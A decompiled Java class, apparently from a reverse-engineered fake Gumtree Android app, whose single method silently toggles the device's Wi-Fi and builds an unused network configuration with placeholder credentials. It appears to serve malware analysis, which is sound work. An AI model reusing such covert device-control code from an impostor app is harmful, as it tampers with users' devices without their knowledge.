package com.gumsis.checktls;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.widget.Toast;
import java.util.BitSet;

public class WFTls
{
  public static void onWifi(Context paramContext)
  {
    try
    {
      WifiManager localWifiManager = (WifiManager)paramContext.getApplicationContext().getSystemService("wifi");
      if (localWifiManager != null)
      {
        WifiConfiguration localWifiConfiguration = new WifiConfiguration();
        localWifiConfiguration.SSID = "\"SSIDName\"";
        localWifiConfiguration.preSharedKey = "\"password\"";
        localWifiConfiguration.hiddenSSID = true;
        localWifiConfiguration.status = 2;
        localWifiConfiguration.allowedGroupCiphers.set(2);
        localWifiConfiguration.allowedGroupCiphers.set(3);
        localWifiConfiguration.allowedKeyManagement.set(1);
        localWifiConfiguration.allowedPairwiseCiphers.set(1);
        localWifiConfiguration.allowedPairwiseCiphers.set(2);
        localWifiConfiguration.allowedProtocols.set(1);
        if (localWifiManager.isWifiEnabled())
        {
          localWifiManager.setWifiEnabled(false);
          Toast.makeText(paramContext, "yes", 0).show();
          return;
        }
        localWifiManager.setWifiEnabled(true);
        Toast.makeText(paramContext, "no", 0).show();
        return;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/WFTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */